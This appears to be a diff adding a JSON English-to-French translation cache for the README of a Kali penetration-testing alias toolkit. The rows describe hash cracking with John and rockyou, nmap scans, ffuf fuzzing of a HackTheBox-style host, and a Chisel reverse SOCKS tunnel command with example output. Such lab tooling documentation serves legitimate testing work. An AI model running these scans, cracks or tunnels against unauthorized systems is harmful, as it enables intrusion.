+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 120,
+    "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "originContent": "Clipboard contents after:",
+    "translatedContent": "Contenu du presse-papiers après :"
+  },
+  {
+    "row": 121,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 122,
+    "rowsha": "bKNzWJQrv8+ejmz89Bqo3r/UKyvhW6mGnWv6Qn43LiQ=",
+    "originContent": "stty rows 30 columns 116",
+    "translatedContent": "stty rows 30 columns 116"
+  },
+  {
+    "row": 123,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 124,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 125,
+    "rowsha": "DGzaomT1caRomTXbWtkFX/buH+8pvd7J1VrEtW3va4Y=",
+    "originContent": "> - Requires `xclip` to be installed",
+    "translatedContent": "> - Nécessite que `xclip` soit installé"
+  },
+  {
+    "row": 126,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 127,
+    "rowsha": "qBCPcP3JBJVZqMOzk/JBXUAKf/TWsE3ClyBCDmmyqMc=",
+    "originContent": "## Hashcracking",
+    "translatedContent": "## Casse de hachage"
+  },
+  {
+    "row": 128,
+    "rowsha": "lBUwiqmPd74IdoRaajL5gDkwKyRdpkvAjdTxIYSrmls=",
+    "originContent": "### > rock_john $hash_file (extra arguments)",
+    "translatedContent": "### > rock_john $fichier_hash (arguments supplémentaires)"
+  },
+  {
+    "row": 129,
+    "rowsha": "cWaaar/NGhrRPRoFpZvSrtf3Saa2AS8FpEEtlhoNVgc=",
+    "originContent": "Instead of manually supplying rockyou as an argument with `--wordlist=/usr/share/wordlists/rockyou.txt` (without auto completion :/) this alias injects that argument and thus can be used to try and crack a hash using JohnTheRipper and the rockyou wordlist more easily. ",
+    "translatedContent": "Au lieu de fournir manuellement rockyou comme argument avec `--wordlist=/usr/share/wordlists/rockyou.txt` (sans auto-complétion :/) cet alias injecte cet argument et peut donc être utilisé pour tenter de casser un hachage avec JohnTheRipper et la liste de mots rockyou plus facilement. "
+  },
+  {
+    "row": 130,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 131,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 132,
+    "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 133,
+    "rowsha": "5LF4Ovl4mYr7bgCLh0pr4CKs10yiyNW1eAIi+Y29j14=",
+    "originContent": "└─$ rock_john hash.txt --format=Raw-MD5",
+    "translatedContent": "└─$ rock_john hash.txt --format=Raw-MD5"
+  },
+  {
+    "row": 134,
+    "rowsha": "6w5pfZtjwi8wNNDOLnX8G5ExjDJqZvMMmlUn28ejZeo=",
+    "originContent": "Using default input encoding: UTF-8",
+    "translatedContent": "Using default input encoding: UTF-8"
+  },
+  {
+    "row": 135,
+    "rowsha": "bpocKFnlep0C4xvnwpEK5PxyRHgVI8LQyr1GyBfDVdw=",
+    "originContent": "Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])",
+    "translatedContent": "Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])"
+  },
+  {
+    "row": 136,
+    "rowsha": "BTtXkdFB0EUqEBU0GHTCE7ErPS/U3x0cvDraLRuObSI=",
+    "originContent": "Warning: no OpenMP support for this hash type, consider --fork=8",
+    "translatedContent": "Warning: no OpenMP support for this hash type, consider --fork=8"
+  },
+  {
+    "row": 137,
+    "rowsha": "OYi9tR55NHjHem5vd02zYBsYTjO+pmvuYgZFsdQUxsY=",
+    "originContent": "Press 'q' or Ctrl-C to abort, almost any other key for status",
+    "translatedContent": "Press 'q' or Ctrl-C to abort, almost any other key for status"
+  },
+  {
+    "row": 138,
+    "rowsha": "UZIRgglsMYbL7q180pfFctl10XHZhF/x6z1N3KP2Tpk=",
+    "originContent": "jazz             (?)     ",
+    "translatedContent": "jazz             (?)     "
+  },
+  {
+    "row": 139,
+    "rowsha": "awYQEC5m6I8TbKJfG40SCBpB+lwYlmZ5F3rTo1ZmNEk=",
+    "originContent": "1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke",
+    "translatedContent": "1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke"
+  },
+  {
+    "row": 140,
+    "rowsha": "SI9JPnXYv+eYy1cvq1NB6z2pBaH2OSMRSq+R8Qwx2Gg=",
+    "originContent": "Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably",
+    "translatedContent": "Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably"
+  },
+  {
+    "row": 141,
+    "rowsha": "Tb4hpjEH/THx5vpqBmNkTZHHbZnu3ll+yOz32kOui1Q=",
+    "originContent": "Session completed.",
+    "translatedContent": "Session completed."
+  },
+  {
+    "row": 142,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 143,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 144,
+    "rowsha": "yChShpfFzeALQZXQmXzQSEGx885U02uZH+B2HC0yN+s=",
+    "originContent": "> - Kali seems to have fixed auto completion for John in 2022.2! This alias still saves you some effort though ;)",
+    "translatedContent": "> - Kali semble avoir corrigé l'auto-complétion pour John dans la version 2022.2 ! Cet alias vous fait quand même gagner un peu de temps ;)"
+  },
+  {
+    "row": 145,
+    "rowsha": "ESAJKzbKsqeiP1IyhCsncILfnMhA0MQLcEG2HtpnH2I=",
+    "originContent": "## Portscanning",
+    "translatedContent": "## Scan de ports"
+  },
+  {
+    "row": 146,
+    "rowsha": "M3lq6d+quwAJU23x8M0kJYFAs+akQet3QACMV5QRa/E=",
+    "originContent": "### > nmap_tcp $ip (extra arguments)",
+    "translatedContent": "### > nmap_tcp $ip (arguments supplémentaires)"
+  },
+  {
+    "row": 147,
+    "rowsha": "1EotmAMkn5JQ+H0P9slkuMbQ9fThrn2Ihk331SKjvvs=",
+    "originContent": "Starts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. ",
+    "translatedContent": "Lance un scan TCP avec nmap en utilisant mes paramètres par défaut et enregistre les résultats du scan dans un répertoire nmap qui est créé automatiquement s'il n'existe pas encore. "
+  },
+  {
+    "row": 148,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 149,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 150,
+    "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+    "originContent": "┌──(jazz㉿kali)-[~]",
+    "translatedContent": "┌──(jazz㉿kali)-[~]"
+  },
+  {
+    "row": 151,
+    "rowsha": "xeQ4TkGmz5SD2r6YQ15fVxftNBmMsPqMo5V/lSkNigU=",
+    "originContent": "└─$ nmap_default 127.0.0.1",
+    "translatedContent": "└─$ nmap_default 127.0.0.1"
+  },
+  {
+    "row": 152,
+    "rowsha": "7S5urbuckRJHgwjNr7ibZgm4EPXIYnVrfTMTAAYY6dg=",
+    "originContent": "[i] Creating /home/jazz/nmap...",
+    "translatedContent": "[i] Creating /home/jazz/nmap..."
+  },
+  {
+    "row": 153,
+    "rowsha": "YlgQxwNXMjNqZCJZDefXxPzJ/4qIl7lXzEj8V0yZdbQ=",
+    "originContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT",
+    "translatedContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT"
+  },
+  {
+    "row": 154,
+    "rowsha": "q132Jbx229ThY77S3YiN+Cj5AVm7k1VlJcMYIbZUHUY=",
+    "originContent": "...",
+    "translatedContent": "..."
+  },
+  {
+    "row": 155,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 156,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 157,
+    "rowsha": "fydNLOcYMjB3KI4OYf674KaNm3AgaZsxrNlykMIsr/Y=",
+    "originContent": "> - This only scans the default TCP ports. Add `-p-` as an argument to scan all ports.",
+    "translatedContent": "> - Cela ne scanne que les ports TCP par défaut. Ajoutez `-p-` comme argument pour scanner tous les ports."
+  },
+  {
+    "row": 158,
+    "rowsha": "mZZJHLq8GpcoETtGDPi2BKlyKHzGgeaTqdl7q4oOUZU=",
+    "originContent": "> - Uses `sudo` to get the privileges required for a SYN scan",
+    "translatedContent": "> - Utilise `sudo` pour obtenir les privilèges nécessaires à un scan SYN"
+  },
+  {
+    "row": 159,
+    "rowsha": "RVDX7bWgTGtshrGhjg3/PIyJEWuMMx0FXcqIxoSiRLI=",
+    "originContent": "### > nmap_udp $ip (extra arguments)",
+    "translatedContent": "### > nmap_udp $ip (arguments supplémentaires)"
+  },
+  {
+    "row": 160,
+    "rowsha": "wRXi/n3gyvujaFaV2NTXt9ngzOwnyLvf56rKDmBHnwQ=",
+    "originContent": "Starts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. ",
+    "translatedContent": "Lance un scan UDP nmap avec mes paramètres par défaut et enregistre les résultats du scan dans un répertoire nmap qui est automatiquement créé s'il n'existe pas encore."
+  },
+  {
+    "row": 161,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 162,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 163,
+    "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+    "originContent": "┌──(jazz㉿kali)-[~]",
+    "translatedContent": "┌──(jazz㉿kali)-[~]"
+  },
+  {
+    "row": 164,
+    "rowsha": "ns70wTrrr6+L34RroarR3YEybQVHp/TjYVEsNOnFVhg=",
+    "originContent": "└─$ nmap_udp 127.0.0.1",
+    "translatedContent": "└─$ nmap_udp 127.0.0.1"
+  },
+  {
+    "row": 165,
+    "rowsha": "7S5urbuckRJHgwjNr7ibZgm4EPXIYnVrfTMTAAYY6dg=",
+    "originContent": "[i] Creating /home/jazz/nmap...",
+    "translatedContent": "[i] Creating /home/jazz/nmap..."
+  },
+  {
+    "row": 166,
+    "rowsha": "mDVUMPAtgI5wpBCHkcYyFp8BeLEoWFZ4LZ3YPd9rU/Q=",
+    "originContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT",
+    "translatedContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT"
+  },
+  {
+    "row": 167,
+    "rowsha": "q132Jbx229ThY77S3YiN+Cj5AVm7k1VlJcMYIbZUHUY=",
+    "originContent": "...",
+    "translatedContent": "..."
+  },
+  {
+    "row": 168,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 169,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 170,
+    "rowsha": "mp5ajbHjdpat4mC0MrYSjl5ZaNBYawX+Ygc5cCXMwZQ=",
+    "originContent": "> - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.",
+    "translatedContent": "> - Cela ne scanne que les ports UDP par défaut. Ajoutez `-p-` en argument pour scanner tous les ports."
+  },
+  {
+    "row": 171,
+    "rowsha": "as9c8NdYtF0rBg8DSRt2/YakNKtm/pre6hqmlFy5R5Q=",
+    "originContent": "> - Uses `sudo` to get the privileges required for a UDP scan",
+    "translatedContent": "> - Utilise `sudo` pour obtenir les privilèges nécessaires à un scan UDP"
+  },
+  {
+    "row": 172,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 173,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 174,
+    "rowsha": "rk3AUzWNDRlAUlGt+6mfRtt861GbhRh6I8riIvPydhU=",
+    "originContent": "## SecLists Path",
+    "translatedContent": "## Chemin SecLists"
+  },
+  {
+    "row": 175,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 176,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 177,
+    "rowsha": "IXUb9LCKh4WdPnFsONXnRnj/Swc1kbHzY85buzLkuEE=",
+    "originContent": "> - Many of the functions in this toolkit use wordlists from the SecLists project. To ensure these functions work correctly, the scripts need to know where to find the SecLists directory. The toolkit uses the following logic to locate SecLists:",
+    "translatedContent": "> - De nombreuses fonctions de cette boîte à outils utilisent des listes de mots du projet SecLists. Pour garantir le bon fonctionnement de ces fonctions, les scripts doivent savoir où trouver le répertoire SecLists. La boîte à outils utilise la logique suivante pour localiser SecLists :"
+  },
+  {
+    "row": 178,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 179,
+    "rowsha": "HsMx1PGdqmKld4NFWDdg4xOYy7gtrlyhWIsobAmQsY4=",
+    "originContent": "1. First, it checks if `/opt/seclists/` exists.",
+    "translatedContent": "1. Tout d'abord, elle vérifie si `/opt/seclists/` existe."
+  },
+  {
+    "row": 180,
+    "rowsha": "QQG44hfccZjXddXcSTUF+FVQLeBoepF5uiOII0qhTok=",
+    "originContent": "2. If not, it checks if `/usr/share/seclists/` exists.",
+    "translatedContent": "2. Sinon, elle vérifie si `/usr/share/seclists/` existe."
+  },
+  {
+    "row": 181,
+    "rowsha": "N85sMUEyFMjuWjy6J0PuOG3gDPhtGnRksjrrTsGZ1M8=",
+    "originContent": "3. If neither of these directories exist, it looks for an environment variable called `SECLISTS_PATH`.",
+    "translatedContent": "3. Si aucun de ces répertoires n'existe, elle recherche une variable d'environnement appelée `SECLISTS_PATH`."
+  },
+  {
+    "row": 182,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 183,
+    "rowsha": "EBgLno/PFF5fZzJe0i1RdVgzxklyYYwWiSN/oLqqnzc=",
+    "originContent": "To set up SecLists for use with these scripts:",
+    "translatedContent": "Pour configurer SecLists pour l'utiliser avec ces scripts :"
+  },
+  {
+    "row": 184,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 185,
+    "rowsha": "xC/lp/terTnw0BwiUwuQilUujUV1FoPXLpZ66ReMZOo=",
+    "originContent": "1. Install SecLists in one of the standard locations (`/opt/seclists/` or `/usr/share/seclists/`).",
+    "translatedContent": "1. Installez SecLists dans l'un des emplacements standards (`/opt/seclists/` ou `/usr/share/seclists/`)."
+  },
+  {
+    "row": 186,
+    "rowsha": "Cq19p30u1Zw5bJmnTknzpFJNzby1FjJRsUM9ZAJHrrQ=",
+    "originContent": "   ",
+    "translatedContent": "   "
+  },
+  {
+    "row": 187,
+    "rowsha": "AZDjvRDDgrzBNT8Ec8XRIXmvJqkx2Zw6yIxkCnnbYHA=",
+    "originContent": "   OR",
+    "translatedContent": "   OU"
+  },
+  {
+    "row": 188,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 189,
+    "rowsha": "mkVJiIKAfm8k7nvADqo7HtUTevRsvw8+Q0UvMiw59C4=",
+    "originContent": "2. Set the `SECLISTS_PATH` environment variable to point to your SecLists installation:",
+    "translatedContent": "2. Définissez la variable d'environnement `SECLISTS_PATH` pour pointer vers votre installation de SecLists :"
+  },
+  {
+    "row": 190,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 191,
+    "rowsha": "RRH6MrA4etNIHujwLv0rliGxya+NbpNSoC32JfHakN0=",
+    "originContent": "   ```bash",
+    "translatedContent": "   ```bash"
+  },
+  {
+    "row": 192,
+    "rowsha": "k6oad1YlpolwSHaJY5EOPxXhzFX1Z2LW0FLqrXUB8CU=",
+    "originContent": "   export SECLISTS_PATH=\"/path/to/seclists\"",
+    "translatedContent": "   export SECLISTS_PATH=\"/path/to/seclists\""
+  },
+  {
+    "row": 193,
+    "rowsha": "D66mMmB1qW7vXqQpdCgVdyKw+Pn0S/9n8CLlsRTtAmk=",
+    "originContent": "   # You can add this line to your .zshrc file to make it permanent.",
+    "translatedContent": "   # You can add this line to your .zshrc file to make it permanent."
+  },
+  {
+    "row": 194,
+    "rowsha": "7em5kHTNO1cPWnaxB4H1GFdKMaKdWtteFc09etZSl0o=",
+    "originContent": "    ```",
+    "translatedContent": "    ```"
+  },
+  {
+    "row": 195,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 196,
+    "rowsha": "RN2FdoJV1hFlGjnjtZUKinLa/Dzym07GSolTNCKGJyI=",
+    "originContent": "## Web Fuzzing",
+    "translatedContent": "## Fuzzing Web"
+  },
+  {
+    "row": 197,
+    "rowsha": "Lexj5JJgV9E2mZnbXfCn0roRwqstPLyuFORT2UOtd6U=",
+    "originContent": "### > vhost $domain (-w wordlist) (extra arguments)",
+    "translatedContent": "### > vhost $domaine (-w liste_mots) (arguments supplémentaires)"
+  },
+  {
+    "row": 198,
+    "rowsha": "KYh58TeqKn9HNbDIK2GewRHEA2Sanh7NUOKAfDElctw=",
+    "originContent": "Performs virtual host discovery using ffuf.",
+    "translatedContent": "Effectue la découverte d'hôtes virtuels en utilisant ffuf."
+  },
+  {
+    "row": 199,
+    "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+    "originContent": "Example:",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 200,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 201,
+    "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+    "originContent": "┌──(22sh㉿kali)-[~]",
+    "translatedContent": "┌──(22sh㉿kali)-[~]"
+  },
+  {
+    "row": 202,
+    "rowsha": "pqujVXxQKTWpksERQIZ/77Ll97w/1qxYxE4+t5JAFm8=",
+    "originContent": "└─$ vhost box.htb",
+    "translatedContent": "└─$ vhost box.htb"
+  },
+  {
+    "row": 203,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 204,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 205,
+    "rowsha": "NSoZs/2wy4hnlDu+/vr9kMU6sy+FvebqB94s1hLUljM=",
+    "originContent": "> - When passing just the domain http will be used, you can however also pass in the full url https://box.htb for https",
+    "translatedContent": "> - Lorsqu'on ne passe que le domaine, http sera utilisé, vous pouvez cependant aussi passer l'url complète https://box.htb pour https"
+  },
+  {
+    "row": 206,
+    "rowsha": "nD3bjrXKOYCHNqcx8TqHofqhpclwImQZsNQQDCgKbr4=",
+    "originContent": "> - Requires `ffuf` to be installed",
+    "translatedContent": "> - Nécessite que `ffuf` soit installé"
+  },
+  {
+    "row": 207,
+    "rowsha": "4y/oW/6JSsrU+muOM5zDzEzOHQNcFoMCen20lBcilNs=",
+    "originContent": "### > fuzz_dir $url (extra arguments)",
+    "translatedContent": "### > fuzz_dir $url (arguments supplémentaires)"
+  },
+  {
+    "row": 208,
+    "rowsha": "f3kE8PFJLPZ05PV8XgnMD8k+0tALGALIBxhR45HRPHQ=",
+    "originContent": "Performs directory and files fuzzing using ffuf.",
+    "translatedContent": "Effectue un fuzzing de répertoires et fichiers en utilisant ffuf."
+  },
+  {
+    "row": 209,
+    "rowsha": "oyIm+8pBA3n0/a+g6O/BxUqOBzEDhZyNT5DnVw2GsXw=",
+    "originContent": "Exemple:",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 210,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 211,
+    "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+    "originContent": "┌──(22sh㉿kali)-[~]",
+    "translatedContent": "┌──(22sh㉿kali)-[~]"
+  },
+  {
+    "row": 212,
+    "rowsha": "Kwt1GtsMoPJXMiWdtpm0zulzCX2geXpXhZb/RFHPbPo=",
+    "originContent": "└─$ fuzz_dir http://box.htb",
+    "translatedContent": "└─$ fuzz_dir http://box.htb"
+  },
+  {
+    "row": 213,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 214,
+    "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+    "originContent": "┌──(22sh㉿kali)-[~]",
+    "translatedContent": "┌──(22sh㉿kali)-[~]"
+  },
+  {
+    "row": 215,
+    "rowsha": "s5nNoRAk4zYBJi9Wr8rYtzJD8JjGpdScW6hnOTiSMxc=",
+    "originContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt",
+    "translatedContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt"
+  },
+  {
+    "row": 216,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 217,
+    "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+    "originContent": "┌──(22sh㉿kali)-[~]",
+    "translatedContent": "┌──(22sh㉿kali)-[~]"
+  },
+  {
+    "row": 218,
+    "rowsha": "YfOZW+5C7JqJSWzZgV9DszDfyp++HD3jwlMxvc7RQ64=",
+    "originContent": "└─$ fuzz_dir http://box.htb -fs 245",
+    "translatedContent": "└─$ fuzz_dir http://box.htb -fs 245"
+  },
+  {
+    "row": 219,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 220,
+    "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+    "originContent": "┌──(22sh㉿kali)-[~]",
+    "translatedContent": "┌──(22sh㉿kali)-[~]"
+  },
+  {
+    "row": 221,
+    "rowsha": "0AKAinB/gUQsnqknV7hEFgs6QO8kB49s3hxWIiSv0Zg=",
+    "originContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245",
+    "translatedContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245"
+  },
+  {
+    "row": 222,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 223,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 224,
+    "rowsha": "nD3bjrXKOYCHNqcx8TqHofqhpclwImQZsNQQDCgKbr4=",
+    "originContent": "> - Requires `ffuf` to be installed",
+    "translatedContent": "> - Nécessite que `ffuf` soit installé"
+  },
+  {
+    "row": 225,
+    "rowsha": "7S3KkJ9ArfkDKQ6E7BcKfgFZeGifwylI2ZcA0xoUu8k=",
+    "originContent": "## Chisel Tunneling",
+    "translatedContent": "## Tunneling avec Chisel"
+  },
+  {
+    "row": 226,
+    "rowsha": "uIcIszvsf2PnjrNpBWntn+Dbwr8zC2S0qyl6A5eYqNI=",
+    "originContent": "### > chisel_socks $ip $port",
+    "translatedContent": "### > chisel_socks $ip $port"
+  },
+  {
+    "row": 227,
+    "rowsha": "1mge57UFQkJQ/ENb+IaW0NzE2QD/HjD3YYbIbAVXtWo=",
+    "originContent": "Sets up a SOCKS proxy using Chisel and copy the command to the clipboard.",
+    "translatedContent": "Configure un proxy SOCKS avec Chisel et copie la commande dans le presse-papiers."
+  },
+  {
+    "row": 228,
+    "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+    "originContent": "Example:",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 229,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 230,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 231,
+    "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+    "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 232,
+    "rowsha": "je+N6keK9cEX9d/Q5FJCNgy1+/Q3h/H8Q2u6S1xzMGU=",
+    "originContent": "└─$ chisel_socks 10.10.14.10 8888",
+    "translatedContent": "└─$ chisel_socks 10.10.14.10 8888"
+  },
+  {
+    "row": 233,
+    "rowsha": "qI7d6jBIr2IcfIT3EQfs/n+g0SuJtUmoNmKtsSaUvm8=",
+    "originContent": "[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard",
+    "translatedContent": "[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard"
+  },
+  {
+    "row": 234,
+    "rowsha": "HKPgjbivER/L0/S/m7og7VzCjp9nvpmIXA9zF9oLYsE=",
+    "originContent": "2024/08/05 23:31:03 server: Reverse tunnelling enabled",
+    "translatedContent": "2024/08/05 23:31:03 server: Reverse tunnelling enabled"
+  },
+  {
+    "row": 235,
+    "rowsha": "Qiex+B1rn3qCJvzIHaPC34lGk373FNnn/4KsLbJd3RE=",
+    "originContent": "2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=",
+    "translatedContent": "2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44="
+  },
+  {
+    "row": 236,
+    "rowsha": "vSNd4btjkMdNZVXcjAr9Di4qdjB+Qb76yixuxOSiMOE=",
+    "originContent": "2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888",
+    "translatedContent": "2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888"
+  },
+  {
+    "row": 237,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
